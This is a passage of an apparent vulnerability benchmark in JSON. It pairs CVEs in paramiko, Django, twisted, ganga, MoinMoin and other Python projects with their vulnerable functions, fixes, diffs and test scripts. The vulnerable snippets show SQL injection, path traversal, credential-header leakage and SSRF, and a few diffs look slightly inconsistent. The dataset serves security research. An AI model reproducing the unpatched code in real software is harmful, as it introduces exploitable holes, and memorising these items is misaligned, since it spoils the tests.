handler(self.auth_handler, m)\n                        if len(self._expected_packet) > 0:\n                            continue\n                    else:\n                        self._log(WARNING, 'Oops, unhandled type %d' % ptype)\n                        msg = Message()\n                        msg.add_byte(cMSG_UNIMPLEMENTED)\n                        msg.add_int(m.seqno)\n                        self._send_message(msg)\n                    self.packetizer.complete_handshake()\n            except SSHException as e:\n                self._log(ERROR, 'Exception: ' + str(e))\n                self._log(ERROR, util.tb_strings())\n                self.saved_exception = e\n            except EOFError as e:\n                self._log(DEBUG, 'EOF in transport thread')\n                self.saved_exception = e\n            except socket.error as e:\n                if type(e.args) is tuple:\n                    if e.args:\n                        emsg = '%s (%d)' % (e.args[1], e.args[0])\n                    else:  # empty tuple, e.g. socket.timeout\n                        emsg = str(e) or repr(e)\n                else:\n                    emsg = e.args\n                self._log(ERROR, 'Socket exception: ' + emsg)\n                self.saved_exception = e\n            except Exception as e:\n                self._log(ERROR, 'Unknown exception: ' + str(e))\n                self._log(ERROR, util.tb_strings())\n                self.saved_exception = e\n            _active_threads.remove(self)\n            for chan in list(self._channels.values()):\n                chan._unlink()\n            if self.active:\n                self.active = False\n                self.packetizer.close()\n                if self.completion_event is not None:\n                    self.completion_event.set()\n                if self.auth_handler is not None:\n                    self.auth_handler.abort()\n                for event in self.channel_events.values():\n                    event.set()\n                try:\n                    self.lock.acquire()\n                    self.server_accept_cv.notify()\n                finally:\n                    self.lock.release()\n            self.sock.close()\n        except:\n            # Don't raise spurious 'NoneType has no attribute X' errors when we\n            # wake up during interpreter shutdown. Or rather -- raise\n            # everything *if* sys.modules (used as a convenient sentinel)\n            # appears to still exist.\n            if self.sys.modules is not None:\n                raise"
      }
    ],
    "vul_patch": "--- a/paramiko/transport.py\n+++ b/paramiko/transport.py\n@@ -57,7 +57,11 @@\n                             continue\n \n                     if ptype in self._handler_table:\n-                        self._handler_table[ptype](self, m)\n+                        error_msg = self._ensure_authed(ptype, m)\n+                        if error_msg:\n+                            self._send_message(error_msg)\n+                        else:\n+                            self._handler_table[ptype](self, m)\n                     elif ptype in self._channel_handler_table:\n                         chanid = m.get_int()\n                         chan = self._channels.get(chanid)\n\n--- /dev/null\n+++ b/paramiko/transport.py\n@@ -0,0 +1,37 @@\n+    def _ensure_authed(self, ptype, message):\n+        \"\"\"\n+        Checks message type against current auth state.\n+\n+        If server mode, and auth has not succeeded, and the message is of a\n+        post-auth type (channel open or global request) an appropriate error\n+        response Message is crafted and returned to caller for sending.\n+\n+        Otherwise (client mode, authed, or pre-auth message) returns None.\n+        \"\"\"\n+        if (\n+            not self.server_mode\n+            or ptype <= HIGHEST_USERAUTH_MESSAGE_ID\n+            or self.is_authenticated()\n+        ):\n+            return None\n+        # WELP. We must be dealing with someone trying to do non-auth things\n+        # without being authed. Tell them off, based on message class.\n+        reply = Message()\n+        # Global requests have no details, just failure.\n+        if ptype == MSG_GLOBAL_REQUEST:\n+            reply.add_byte(cMSG_REQUEST_FAILURE)\n+        # Channel opens let us reject w/ a specific type + message.\n+        elif ptype == MSG_CHANNEL_OPEN:\n+            kind = message.get_text()\n+            chanid = message.get_int()\n+            reply.add_byte(cMSG_CHANNEL_OPEN_FAILURE)\n+            reply.add_int(chanid)\n+            reply.add_int(OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED)\n+            reply.add_string('')\n+            reply.add_string('en')\n+        # NOTE: Post-open channel messages do not need checking; the above will\n+        # reject attemps to open channels, meaning that even if a malicious\n+        # user tries to send a MSG_CHANNEL_REQUEST, it will simply fall under\n+        # the logic that handles unknown channel IDs (as the channel list will\n+        # be empty.)\n+        return reply\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-40954",
    "cve_description": "A SQL injection vulnerability in Grzegorz Marczynski Dynamic Progress Bar (aka web_progress) v. 11.0 through 11.0.2, v12.0 through v12.0.2, v.13.0 through v13.0.2, v.14.0 through v14.0.2.1, v.15.0 through v15.0.2, and v16.0 through v16.0.2.1 allows a remote attacker to gain privileges via the recency parameter in models/web_progress.py component.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/gmarczynski/odoo-web-progress",
    "patch_url": [
      "https://github.com/gmarczynski/odoo-web-progress/commit/3c867f1cf7447449c81b1aa24ebb1f7ae757489f"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_225_1",
        "commit": "bd2d5b3",
        "file_path": "web_progress/models/web_progress.py",
        "start_line": 160,
        "end_line": 183,
        "snippet": "    def get_all_progress(self, recency=_progress_period_secs * 2):\n        \"\"\"\n        Get progress information for all ongoing operations\n        :param recency: (int) seconds back\n        :return list of progress codes\n        \"\"\"\n        query = \"\"\"\n        SELECT code, array_agg(state) FROM web_progress\n        WHERE create_date > timezone('utc', now()) - INTERVAL '{recency} SECOND'\n              AND recur_depth = 0 {user_id}\n        GROUP BY code\n        \"\"\".format(\n            recency=recency or 0,\n            user_id=not self.is_progress_admin() and \"AND create_uid = {user_id}\"\n                .format(\n                user_id=self.env.user.id,\n            ) or '')\n        # superuser has right to see (and cancel) progress of everybody\n        self.env.cr.execute(query)\n        result = self.env.cr.fetchall()\n        ret = [{\n            'code': r[0],\n        } for r in result if r[0] and 'cancel' not in r[1] and 'done' not in r[1]]\n        return ret"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_225_1",
        "commit": "3c867f1",
        "file_path": "web_progress/models/web_progress.py",
        "start_line": 160,
        "end_line": 183,
        "snippet": "    def get_all_progress(self, recency=_progress_period_secs * 2):\n        \"\"\"\n        Get progress information for all ongoing operations\n        :param recency: (int) seconds back\n        :return list of progress codes\n        \"\"\"\n        query = \"\"\"\n        SELECT code, array_agg(state) FROM web_progress\n        WHERE create_date > timezone('utc', now()) - INTERVAL '%s SECOND'\n              AND recur_depth = 0 {user_id}\n        GROUP BY code\n        \"\"\".format(\n            recency=recency or 0,\n            user_id=not self.is_progress_admin() and \"AND create_uid = {user_id}\"\n                .format(\n                user_id=self.env.user.id,\n            ) or '')\n        # superuser has right to see (and cancel) progress of everybody\n        self.env.cr.execute(query, (recency, ))\n        result = self.env.cr.fetchall()\n        ret = [{\n            'code': r[0],\n        } for r in result if r[0] and 'cancel' not in r[1] and 'done' not in r[1]]\n        return ret"
      }
    ],
    "vul_patch": "--- a/web_progress/models/web_progress.py\n+++ b/web_progress/models/web_progress.py\n@@ -6,7 +6,7 @@\n         \"\"\"\n         query = \"\"\"\n         SELECT code, array_agg(state) FROM web_progress\n-        WHERE create_date > timezone('utc', now()) - INTERVAL '{recency} SECOND'\n+        WHERE create_date > timezone('utc', now()) - INTERVAL '%s SECOND'\n               AND recur_depth = 0 {user_id}\n         GROUP BY code\n         \"\"\".format(\n@@ -16,7 +16,7 @@\n                 user_id=self.env.user.id,\n             ) or '')\n         # superuser has right to see (and cancel) progress of everybody\n-        self.env.cr.execute(query)\n+        self.env.cr.execute(query, (recency, ))\n         result = self.env.cr.fetchall()\n         ret = [{\n             'code': r[0],\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2019-14234",
    "cve_description": "An issue was discovered in Django 1.11.x before 1.11.23, 2.1.x before 2.1.11, and 2.2.x before 2.2.4. Due to an error in shallow key transformation, key and index lookups for django.contrib.postgres.fields.JSONField, and key lookups for django.contrib.postgres.fields.HStoreField, were subject to SQL injection. This could, for example, be exploited via crafted use of \"OR 1=1\" in a key or index name to return all records, using a suitably crafted dictionary, with dictionary expansion, as the **kwargs passed to the QuerySet.filter() function.",
    "cwe_info": {
      "CWE-89": {
        "name": "Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')",
        "description": "The product constructs all or part of an SQL command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component. Without sufficient removal or quoting of SQL syntax in user-controllable inputs, the generated SQL query can cause those inputs to be interpreted as SQL instead of ordinary user data."
      }
    },
    "repo": "https://github.com/django/django",
    "patch_url": [
      "https://github.com/django/django/commit/ed682a24fca774818542757651bfba576c3fc3ef",
      "https://github.com/django/django/commit/4f5b58f5cd3c57fee9972ab074f8dc6895d8f387",
      "https://github.com/django/django/commit/f74b3ae3628c26e1b4f8db3d13a91d52a833a975"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_151_1",
        "commit": "52479ac",
        "file_path": "django/contrib/postgres/fields/hstore.py",
        "start_line": 87,
        "end_line": 89,
        "snippet": "    def as_sql(self, compiler, connection):\n        lhs, params = compiler.compile(self.lhs)\n        return \"(%s -> '%s')\" % (lhs, self.key_name), params"
      },
      {
        "id": "vul_py_151_2",
        "commit": "52479ac",
        "file_path": "django/contrib/postgres/fields/hstore.py",
        "start_line": 97,
        "end_line": 112,
        "snippet": "    def __call__(self, *args, **kwargs):\n        return KeyTransform(self.key_name, *args, **kwargs)\n\n\n@HStoreField.register_lookup\nclass KeysTransform(Transform):\n    lookup_name = 'keys'\n    function = 'akeys'\n    output_field = ArrayField(TextField())\n\n\n@HStoreField.register_lookup\nclass ValuesTransform(Transform):\n    lookup_name = 'values'\n    function = 'avals'\n    output_field = ArrayField(TextField())"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_151_1",
        "commit": "ed682a2",
        "file_path": "django/contrib/postgres/fields/hstore.py",
        "start_line": 87,
        "end_line": 89,
        "snippet": "    def as_sql(self, compiler, connection):\n        lhs, params = compiler.compile(self.lhs)\n        return '(%s -> %%s)' % lhs, [self.key_name] + params"
      },
      {
        "id": "fix_py_151_2",
        "commit": "ed682a2",
        "file_path": "django/contrib/postgres/fields/hstore.py",
        "start_line": 97,
        "end_line": 110,
        "snippet": "    def __call__(self, *args, **kwargs):\n        return KeyTransform(self.key_name, *args, **kwargs)\n\n\n@HStoreField.register_lookup\nclass KeysTransform(Transform):\n    lookup_name = 'keys'\n    function = 'akeys'\n    output_field = ArrayField(TextField())\n\n\n@HStoreField.register_lookup\nclass ValuesTransform(Transform):\n    lookup_name = 'values'"
      }
    ],
    "vul_patch": "--- a/django/contrib/postgres/fields/hstore.py\n+++ b/django/contrib/postgres/fields/hstore.py\n@@ -1,3 +1,3 @@\n     def as_sql(self, compiler, connection):\n         lhs, params = compiler.compile(self.lhs)\n-        return \"(%s -> '%s')\" % (lhs, self.key_name), params\n+        return '(%s -> %%s)' % lhs, [self.key_name] + params\n\n--- a/django/contrib/postgres/fields/hstore.py\n+++ b/django/contrib/postgres/fields/hstore.py\n@@ -12,5 +12,3 @@\n @HStoreField.register_lookup\n class ValuesTransform(Transform):\n     lookup_name = 'values'\n-    function = 'avals'\n-    output_field = ArrayField(TextField())\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2022-21712",
    "cve_description": "twisted is an event-driven networking engine written in Python. In affected versions twisted exposes cookies and authorization headers when following cross-origin redirects. This issue is present in the `twited.web.RedirectAgent` and `twisted.web. BrowserLikeRedirectAgent` functions. Users are advised to upgrade. There are no known workarounds.",
    "cwe_info": {
      "CWE-200": {
        "name": "Exposure of Sensitive Information to an Unauthorized Actor",
        "description": "The product exposes sensitive information to an actor that is not explicitly authorized to have access to that information."
      }
    },
    "repo": "https://github.com/twisted/twisted",
    "patch_url": [
      "https://github.com/twisted/twisted/commit/af8fe78542a6f2bf2235ccee8158d9c88d31e8e2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_53_1",
        "commit": "7039a20",
        "file_path": "src/twisted/web/client.py",
        "start_line": 2144,
        "end_line": 2146,
        "snippet": "    def __init__(self, agent, redirectLimit=20):\n        self._agent = agent\n        self._redirectLimit = redirectLimit"
      },
      {
        "id": "vul_py_53_2",
        "commit": "7039a20",
        "file_path": "src/twisted/web/client.py",
        "start_line": 2172,
        "end_line": 2189,
        "snippet": "    def _handleRedirect(self, response, method, uri, headers, redirectCount):\n        \"\"\"\n        Handle a redirect response, checking the number of redirects already\n        followed, and extracting the location header fields.\n        \"\"\"\n        if redirectCount >= self._redirectLimit:\n            err = error.InfiniteRedirection(\n                response.code, b\"Infinite redirection detected\", location=uri\n            )\n            raise ResponseFailed([Failure(err)], response)\n        locationHeaders = response.headers.getRawHeaders(b\"location\", [])\n        if not locationHeaders:\n            err = error.RedirectWithNoLocation(\n                response.code, b\"No location header field\", uri\n            )\n            raise ResponseFailed([Failure(err)], response)\n        location = self._resolveLocation(uri, locationHeaders[0])\n        deferred = self._agent.request(method, location, headers)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_53_1",
        "commit": "af8fe78",
        "file_path": "src/twisted/web/client.py",
        "start_line": 2114,
        "end_line": 2172,
        "snippet": "_canonicalHeaderName = Headers()._canonicalNameCaps\n_defaultSensitiveHeaders = frozenset(\n    [\n        b\"Authorization\",\n        b\"Cookie\",\n        b\"Cookie2\",\n        b\"Proxy-Authorization\",\n        b\"WWW-Authenticate\",\n    ]\n)\n\n\n@implementer(IAgent)\nclass RedirectAgent:\n    \"\"\"\n    An L{Agent} wrapper which handles HTTP redirects.\n\n    The implementation is rather strict: 301 and 302 behaves like 307, not\n    redirecting automatically on methods different from I{GET} and I{HEAD}.\n\n    See L{BrowserLikeRedirectAgent} for a redirecting Agent that behaves more\n    like a web browser.\n\n    @param redirectLimit: The maximum number of times the agent is allowed to\n        follow redirects before failing with a L{error.InfiniteRedirection}.\n\n    @param sensitiveHeaderNames: An iterable of C{bytes} enumerating the names\n        of headers that must not be transmitted when redirecting to a different\n        origins.  These will be consulted in addition to the protocol-specified\n        set of headers that contain sensitive information.\n\n    @cvar _redirectResponses: A L{list} of HTTP status codes to be redirected\n        for I{GET} and I{HEAD} methods.\n\n    @cvar _seeOtherResponses: A L{list} of HTTP status codes to be redirected\n        for any method and the method altered to I{GET}.\n\n    @since: 11.1\n    \"\"\"\n\n    _redirectResponses = [\n        http.MOVED_PERMANENTLY,\n        http.FOUND,\n        http.TEMPORARY_REDIRECT,\n        http.PERMANENT_REDIRECT,\n    ]\n    _seeOtherResponses = [http.SEE_OTHER]\n\n    def __init__(\n        self,\n        agent: IAgent,\n        redirectLimit: int = 20,\n        sensitiveHeaderNames: Iterable[bytes] = (),\n    ):\n        self._agent = agent\n        self._redirectLimit = redirectLimit\n        sensitive = {_canonicalHeaderName(each) for each in sensitiveHeaderNames}\n        sensitive.update(_defaultSensitiveHeaders)\n        self._sensitiveHeaderNames = sensitive"
      },
      {
        "id": "fix_py_53_2",
        "commit": "af8fe78",
        "file_path": "src/twisted/web/client.py",
        "start_line": 2198,
        "end_line": 2240,
        "snippet": "    def _handleRedirect(self, response, method, uri, headers, redirectCount):\n        \"\"\"\n        Handle a redirect response, checking the number of redirects already\n        followed, and extracting the location header fields.\n        \"\"\"\n        if redirectCount >= self._redirectLimit:\n            err = error.InfiniteRedirection(\n                response.code, b\"Infinite redirection detected\", location=uri\n            )\n            raise ResponseFailed([Failure(err)], response)\n        locationHeaders = response.headers.getRawHeaders(b\"location\", [])\n        if not locationHeaders:\n            err = error.RedirectWithNoLocation(\n                response.code, b\"No location header field\", uri\n            )\n            raise ResponseFailed([Failure(err)], response)\n        location = self._resolveLocation(uri, locationHeaders[0])\n        if headers:\n            parsedURI = URI.fromBytes(uri)\n            parsedLocation = URI.fromBytes(location)\n            sameOrigin = (\n                (parsedURI.scheme == parsedLocation.scheme)\n                and (parsedURI.host == parsedLocation.host)\n                and (parsedURI.port == parsedLocation.port)\n            )\n            if not sameOrigin:\n                headers = Headers(\n                    {\n                        rawName: rawValue\n                        for rawName, rawValue in headers.getAllRawHeaders()\n                        if rawName not in self._sensitiveHeaderNames\n                    }\n                )\n        deferred = self._agent.request(method, location, headers)\n\n        def _chainResponse(newResponse):\n            newResponse.setPreviousResponse(response)\n            return newResponse\n\n        deferred.addCallback(_chainResponse)\n        return deferred.addCallback(\n            self._handleResponse, method, uri, headers, redirectCount + 1\n        )"
      }
    ],
    "vul_patch": "--- a/src/twisted/web/client.py\n+++ b/src/twisted/web/client.py\n@@ -1,3 +1,59 @@\n-    def __init__(self, agent, redirectLimit=20):\n+_canonicalHeaderName = Headers()._canonicalNameCaps\n+_defaultSensitiveHeaders = frozenset(\n+    [\n+        b\"Authorization\",\n+        b\"Cookie\",\n+        b\"Cookie2\",\n+        b\"Proxy-Authorization\",\n+        b\"WWW-Authenticate\",\n+    ]\n+)\n+\n+\n+@implementer(IAgent)\n+class RedirectAgent:\n+    \"\"\"\n+    An L{Agent} wrapper which handles HTTP redirects.\n+\n+    The implementation is rather strict: 301 and 302 behaves like 307, not\n+    redirecting automatically on methods different from I{GET} and I{HEAD}.\n+\n+    See L{BrowserLikeRedirectAgent} for a redirecting Agent that behaves more\n+    like a web browser.\n+\n+    @param redirectLimit: The maximum number of times the agent is allowed to\n+        follow redirects before failing with a L{error.InfiniteRedirection}.\n+\n+    @param sensitiveHeaderNames: An iterable of C{bytes} enumerating the names\n+        of headers that must not be transmitted when redirecting to a different\n+        origins.  These will be consulted in addition to the protocol-specified\n+        set of headers that contain sensitive information.\n+\n+    @cvar _redirectResponses: A L{list} of HTTP status codes to be redirected\n+        for I{GET} and I{HEAD} methods.\n+\n+    @cvar _seeOtherResponses: A L{list} of HTTP status codes to be redirected\n+        for any method and the method altered to I{GET}.\n+\n+    @since: 11.1\n+    \"\"\"\n+\n+    _redirectResponses = [\n+        http.MOVED_PERMANENTLY,\n+        http.FOUND,\n+        http.TEMPORARY_REDIRECT,\n+        http.PERMANENT_REDIRECT,\n+    ]\n+    _seeOtherResponses = [http.SEE_OTHER]\n+\n+    def __init__(\n+        self,\n+        agent: IAgent,\n+        redirectLimit: int = 20,\n+        sensitiveHeaderNames: Iterable[bytes] = (),\n+    ):\n         self._agent = agent\n         self._redirectLimit = redirectLimit\n+        sensitive = {_canonicalHeaderName(each) for each in sensitiveHeaderNames}\n+        sensitive.update(_defaultSensitiveHeaders)\n+        self._sensitiveHeaderNames = sensitive\n\n--- a/src/twisted/web/client.py\n+++ b/src/twisted/web/client.py\n@@ -15,4 +15,29 @@\n             )\n             raise ResponseFailed([Failure(err)], response)\n         location = self._resolveLocation(uri, locationHeaders[0])\n+        if headers:\n+            parsedURI = URI.fromBytes(uri)\n+            parsedLocation = URI.fromBytes(location)\n+            sameOrigin = (\n+                (parsedURI.scheme == parsedLocation.scheme)\n+                and (parsedURI.host == parsedLocation.host)\n+                and (parsedURI.port == parsedLocation.port)\n+            )\n+            if not sameOrigin:\n+                headers = Headers(\n+                    {\n+                        rawName: rawValue\n+                        for rawName, rawValue in headers.getAllRawHeaders()\n+                        if rawName not in self._sensitiveHeaderNames\n+                    }\n+                )\n         deferred = self._agent.request(method, location, headers)\n+\n+        def _chainResponse(newResponse):\n+            newResponse.setPreviousResponse(response)\n+            return newResponse\n+\n+        deferred.addCallback(_chainResponse)\n+        return deferred.addCallback(\n+            self._handleResponse, method, uri, headers, redirectCount + 1\n+        )\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-21712:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/twisted\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-21712/bin/python -m pytest src/twisted/web/test/test_agent.py::RedirectAgentTests  src/twisted/web/test/test_agent.py::RedirectAgentTests -p no:warning --disable-warnings --import-mode=importlib\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2022-21712:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/twisted\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2022-21712/bin/python -m pytest src/twisted/web/test/test_agent.py -p no:warning --disable-warnings --import-mode=importlib\n"
  },
  {
    "cve_id": "CVE-2022-31507",
    "cve_description": "The ganga-devs/ganga repository before 8.5.10 on GitHub allows absolute path traversal because the Flask send_file function is used unsafely.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/ganga-devs/ganga",
    "patch_url": [
      "https://github.com/ganga-devs/ganga/commit/730e7aba192407d35eb37dd7938d49071124be8c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_139_1",
        "commit": "0c0f9e3",
        "file_path": "ganga/GangaGUI/gui/routes.py",
        "start_line": 639,
        "end_line": 689,
        "snippet": "def job_browse(job_id: int, path):\n    \"\"\"\n    Browse directory of the job.\n    :param job_id: int\n    :param path: str\n    \"\"\"\n\n    try:\n        # Query job information\n        job_info = query_internal_api(f\"/internal/jobs/{job_id}\", \"get\")\n\n        # Base directory of the job\n        job_base_dir = os.path.dirname(os.path.dirname(job_info[\"outputdir\"]))\n\n    except Exception as err:\n        # Display error on the GUI\n        flash(str(err), \"danger\")\n        return redirect(url_for(\"job_page\", job_id=job_id))\n\n    # Join the base and the requested path\n    abs_path = os.path.join(job_base_dir, path)\n\n    # URL path variable for going back\n    back_path = os.path.dirname(abs_path).replace(job_base_dir, \"\")\n\n    # If path doesn't exist\n    if not os.path.exists(abs_path):\n        flash(\"Directory for this job does not exist.\", \"warning\")\n        return redirect(url_for(\"job_page\", job_id=job_id))\n\n    # Check if path is a file and send\n    if os.path.isfile(abs_path):\n        return send_file(abs_path)\n\n    files_info = []\n\n    # Show directory contents\n    files = os.listdir(abs_path)\n\n    # Store directory information\n    for file in files:\n        files_info.append({\n            \"file\": file,\n            \"directory\": os.path.isdir(os.path.join(abs_path, file))\n        })\n\n    return render_template('job_dir.html', title=f\"Job {job_id} Directory\",\n                           job_id=job_id,\n                           abs_path=abs_path,\n                           files_info=files_info,\n                           back_path=back_path)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_139_1",
        "commit": "730e7ab",
        "file_path": "ganga/GangaGUI/gui/routes.py",
        "start_line": 639,
        "end_line": 689,
        "snippet": "def job_browse(job_id: int, path):\n    \"\"\"\n    Browse directory of the job.\n    :param job_id: int\n    :param path: str\n    \"\"\"\n\n    try:\n        # Query job information\n        job_info = query_internal_api(f\"/internal/jobs/{job_id}\", \"get\")\n\n        # Base directory of the job\n        job_base_dir = os.path.dirname(os.path.dirname(job_info[\"outputdir\"]))\n\n    except Exception as err:\n        # Display error on the GUI\n        flash(str(err), \"danger\")\n        return redirect(url_for(\"job_page\", job_id=job_id))\n\n    # Join the base and the requested path\n    abs_path = safe_join(job_base_dir, path)\n\n    # URL path variable for going back\n    back_path = os.path.dirname(abs_path).replace(job_base_dir, \"\")\n\n    # If path doesn't exist\n    if not os.path.exists(abs_path):\n        flash(\"Directory for this job does not exist.\", \"warning\")\n        return redirect(url_for(\"job_page\", job_id=job_id))\n\n    # Check if path is a file and send\n    if os.path.isfile(abs_path):\n        return send_file(abs_path)\n\n    files_info = []\n\n    # Show directory contents\n    files = os.listdir(abs_path)\n\n    # Store directory information\n    for file in files:\n        files_info.append({\n            \"file\": file,\n            \"directory\": os.path.isdir(os.path.join(abs_path, file))\n        })\n\n    return render_template('job_dir.html', title=f\"Job {job_id} Directory\",\n                           job_id=job_id,\n                           abs_path=abs_path,\n                           files_info=files_info,\n                           back_path=back_path)"
      }
    ],
    "vul_patch": "--- a/ganga/GangaGUI/gui/routes.py\n+++ b/ganga/GangaGUI/gui/routes.py\n@@ -18,7 +18,7 @@\n         return redirect(url_for(\"job_page\", job_id=job_id))\n \n     # Join the base and the requested path\n-    abs_path = os.path.join(job_base_dir, path)\n+    abs_path = safe_join(job_base_dir, path)\n \n     # URL path variable for going back\n     back_path = os.path.dirname(abs_path).replace(job_base_dir, \"\")\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2020-25074",
    "cve_description": "The cache action in action/cache.py in MoinMoin through 1.9.10 allows directory traversal through a crafted HTTP request. An attacker who can upload attachments to the wiki can use this to achieve remote code execution.",
    "cwe_info": {
      "CWE-73": {
        "name": "External Control of File Name or Path",
        "description": "The product allows user input to control or influence paths or file names that are used in filesystem operations."
      },
      "CWE-22": {
        "name": "Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')",
        "description": "The product uses external input to construct a pathname that is intended to identify a file or directory that is located underneath a restricted parent directory, but the product does not properly neutralize special elements within the pathname that can cause the pathname to resolve to a location that is outside of the restricted directory."
      }
    },
    "repo": "https://github.com/moinwiki/moin-1.9",
    "patch_url": [
      "https://github.com/moinwiki/moin-1.9/commit/6b96a9060069302996b5af47fd4a388fc80172b7"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_170_1",
        "commit": "31de913",
        "file_path": "MoinMoin/action/cache.py",
        "start_line": 237,
        "end_line": 241,
        "snippet": "def _do(request, do, key):\n    if do == 'get':\n        _do_get(request, key)\n    elif do == 'remove':\n        _do_remove(request, key)"
      },
      {
        "id": "vul_py_170_2",
        "commit": "31de913",
        "file_path": "MoinMoin/action/cache.py",
        "start_line": 243,
        "end_line": 246,
        "snippet": "def execute(pagename, request):\n    do = request.values.get('do')\n    key = request.values.get('key')\n    _do(request, do, key)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_170_1",
        "commit": "6b96a90",
        "file_path": "MoinMoin/action/cache.py",
        "start_line": 106,
        "end_line": 116,
        "snippet": "def valid_key(key):\n    # make sure the key looks like keys generated by key()\n    if not isinstance(key, unicode):\n        # key is None (not given in url args) or something unexpected\n        return False\n    try:\n        int(key, 16)  # try to evaluate as hex number\n    except ValueError:\n        # was not a hex number\n        return False\n    return len(key) == 40  # hmac-sha1 hexdigest == 40 hex chars"
      },
      {
        "id": "fix_py_170_2",
        "commit": "6b96a90",
        "file_path": "MoinMoin/action/cache.py",
        "start_line": 250,
        "end_line": 259,
        "snippet": "def execute(pagename, request):\n    do = request.values.get('do')\n    key = request.values.get('key')\n    valid = valid_key(key)  # validate untrusted input\n    if valid and do == 'get':\n        _do_get(request, key)\n    elif valid and do == 'remove':\n        _do_remove(request, key)\n    else:\n        request.status_code = 404"
      }
    ],
    "vul_patch": "--- a/MoinMoin/action/cache.py\n+++ b/MoinMoin/action/cache.py\n@@ -1,5 +1,11 @@\n-def _do(request, do, key):\n-    if do == 'get':\n-        _do_get(request, key)\n-    elif do == 'remove':\n-        _do_remove(request, key)\n+def valid_key(key):\n+    # make sure the key looks like keys generated by key()\n+    if not isinstance(key, unicode):\n+        # key is None (not given in url args) or something unexpected\n+        return False\n+    try:\n+        int(key, 16)  # try to evaluate as hex number\n+    except ValueError:\n+        # was not a hex number\n+        return False\n+    return len(key) == 40  # hmac-sha1 hexdigest == 40 hex chars\n\n--- a/MoinMoin/action/cache.py\n+++ b/MoinMoin/action/cache.py\n@@ -1,4 +1,10 @@\n def execute(pagename, request):\n     do = request.values.get('do')\n     key = request.values.get('key')\n-    _do(request, do, key)\n+    valid = valid_key(key)  # validate untrusted input\n+    if valid and do == 'get':\n+        _do_get(request, key)\n+    elif valid and do == 'remove':\n+        _do_remove(request, key)\n+    else:\n+        request.status_code = 404\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2024-31215",
    "cve_description": "Mobile Security Framework (MobSF) is a security research platform for mobile applications in Android, iOS and Windows Mobile.\nA SSRF vulnerability in firebase database check logic. The attacker can cause the server to make a connection to internal-only services within the organization\u2019s infrastructure. When a malicious app is uploaded to Static analyzer, it is possible to make internal requests. This vulnerability has been patched in version 3.9.8.\n",
    "cwe_info": {
      "CWE-918": {
        "name": "Server-Side Request Forgery (SSRF)",
        "description": "The web server receives a URL or similar request from an upstream component and retrieves the contents of this URL, but it does not sufficiently ensure that the request is being sent to the expected destination."
      }
    },
    "repo": "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
    "patch_url": [
      "https://github.com/MobSF/Mobile-Security-Framework-MobSF/commit/43bb71d115d78c03faa82d75445dd908e9b32716"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_239_1",
        "commit": "6bce5a2",
        "file_path": "mobsf/StaticAnalyzer/views/common/shared_func.py",
        "start_line": 255,
        "end_line": 274,
        "snippet": "def open_firebase(url):\n    # Detect Open Firebase Database\n    try:\n        if not valid_host(url):\n            logger.warning('Invalid Firebase URL')\n            return url, False\n        purl = urlparse(url)\n        base_url = '{}://{}/.json'.format(purl.scheme, purl.netloc)\n        proxies, verify = upstream_proxy('https')\n        headers = {\n            'User-Agent': ('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1)'\n                           ' AppleWebKit/537.36 (KHTML, like Gecko) '\n                           'Chrome/39.0.2171.95 Safari/537.36')}\n        resp = requests.get(base_url, headers=headers,\n                            proxies=proxies, verify=verify)\n        if resp.status_code == 200:\n            return base_url, True\n    except Exception:\n        logger.warning('Open Firebase DB detection failed.')\n    return url, False"
      },
      {
        "id": "vul_py_239_2",
        "commit": "6bce5a2",
        "file_path": "mobsf/StaticAnalyzer/views/common/shared_func.py",
        "start_line": 277,
        "end_line": 287,
